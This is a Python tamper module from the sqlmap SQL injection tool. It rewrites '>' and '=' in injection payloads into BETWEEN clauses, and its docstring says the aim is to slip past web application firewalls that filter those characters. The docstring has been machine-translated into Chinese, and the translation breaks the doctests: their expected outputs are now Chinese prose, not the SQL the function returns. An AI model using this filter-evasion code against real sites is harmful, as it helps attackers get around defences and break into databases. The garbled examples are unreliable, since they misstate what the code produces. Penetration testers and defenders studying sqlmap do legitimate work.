#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    "\n    将大于运算符 (>) 替换为 NOT BETWEEN 0 AND #，将等号 (=) 替换为 BETWEEN # AND #\n\n    测试针对：\n        * 微软 SQL Server 2005\n        * MySQL 4、5.0 和 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n\n    Notes:\n        * 可用于绕过薄弱且定制的 Web 应用程序防火墙\n          过滤大于号字符\n        * BETWEEN 子句是 SQL 标准。因此，这个篡改脚本\n          应该适用于所有（？）数据库\n\n    >>> tamper('1 AND A > B--')\n    '1 和 A 不在 0 和 B 之间--'\n    >>> tamper('1 AND A = B--')\n    '1 和 B 之间的 A--'\n    >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')\n    '1 和 LAST_INSERT_ROWID() 位于 LAST_INSERT_ROWID() 和 LAST_INSERT_ROWID() 之间'\n    "

    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)

        if match:
            _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
            retVal = retVal.replace(match.group(0), _)
        else:
            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", r" NOT BETWEEN 0 AND \g<1>", payload)

        if retVal == payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*", payload)

            if match:
                _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                retVal = retVal.replace(match.group(0), _)

    return retVal
